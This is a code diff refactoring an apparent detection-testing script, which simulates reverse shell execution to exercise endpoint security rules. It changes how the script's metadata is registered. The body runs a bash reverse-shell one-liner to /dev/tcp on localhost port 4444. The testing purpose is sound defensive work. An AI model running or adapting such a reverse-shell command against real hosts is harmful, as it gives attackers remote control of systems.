@@ -4,10 +4,9 @@
 # 2.0.
 
 from . import _common
-from . import RtaMetadata
 
 
-metadata = RtaMetadata(
+@register_code_rta(
     id="83b04be5-ed0f-4efd-a7fd-d5db2b8ab62f",
     platforms=["macos", "linux"],
     endpoint_rules=[
@@ -19,11 +18,7 @@ metadata = RtaMetadata(
     siem_rules=[],
     techniques=["T1071", "T1059"],
 )
-
-
-@_common.requires_os(*metadata.platforms)
 def main():
-
     _common.log("Executing command to simulate reverse shell execution")
     _common.execute(['bash -c "bash -i >/dev/tcp/127.0.0.1/4444" 0>&1'], shell=True)
 
